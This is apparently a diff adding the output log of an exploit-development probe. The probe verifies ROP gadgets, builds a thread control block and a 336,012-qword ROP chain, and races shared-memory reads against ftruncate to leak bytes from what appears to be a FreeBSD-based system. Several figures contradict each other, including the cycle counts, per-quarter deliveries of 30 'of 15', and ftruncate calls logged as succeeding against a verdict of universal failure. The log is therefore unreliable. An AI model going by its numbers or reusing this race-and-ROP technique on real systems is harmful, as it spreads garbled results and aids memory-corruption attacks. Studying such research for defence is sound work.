@@ -1,0 +1,46 @@
+=== PROBE 1530a: shm read vs ftruncate ===
+
+fn_addr=0x000000082FF80B57 pid=186
+
+[A] gadget verification
+eboot=0x0000000040110000
+  pop_rax=OK pop_rdi=OK pop_rsi=OK pop_rdx=OK ret=OK pop_rsp=OK
+
+[B] shm object
+  shm_open(SHM_ANON=1) -> 45
+  ftruncate(45, 0x8000) rv=0
+  shm mmap -> 0x0000000311BE8000
+  marker page readable and 0x41: true
+  destination mmap -> 0x0000000311BF0000
+  leak channel mmap -> 0x0000000311BF4000
+  shm filled with 0x41, both destinations zeroed
+
+[C] child chain
+  stack mmap -> 0x0000000315E78000 need=2708568 alloc=2719744
+  building TCB
+  TCB at 0x315e78000 fs_ptr at 0x315e79000
+  concatenating 336012 qwords
+  chain qwords=336012 bytes=2688096 alloc=2719744 stack=0x0000000315E78000
+  chain write head_ok=true tail_ok=true
+
+[D] race
+  thr_new rv=0 child_tid=100929
+  positive control: destination turned 0x41 = true
+  [dbg] ftruncate(45,0x8000) ok=true rv=0
+  [dbg] ftruncate(45,0x8000) ok=true rv=0
+  [dbg] ftruncate(45,0x8000) ok=true rv=0
+  round 10 sampled=20 dead=0 foreign=0
+  round 20 sampled=40 dead=0 foreign=0
+  round 30 sampled=60 dead=0 foreign=0
+  round 40 sampled=80 dead=0 foreign=0
+  round 50 sampled=100 dead=0 foreign=0
+  round 60 sampled=120 dead=0 foreign=0
+  rounds=60 cycles=2 samples=120 dead=0 foreign_bytes=0
+  child delivered per quarter: 30 30 30 30 (of 15 each)
+
+[E] verdict
+  VERDICT VOID: 120 of 120 cycles had a truncate fail, so neither a
+  foreign byte nor a clean result from this run means anything
+  final pid=186 expected 186
+
+=== PROBE 1530a COMPLETE ===
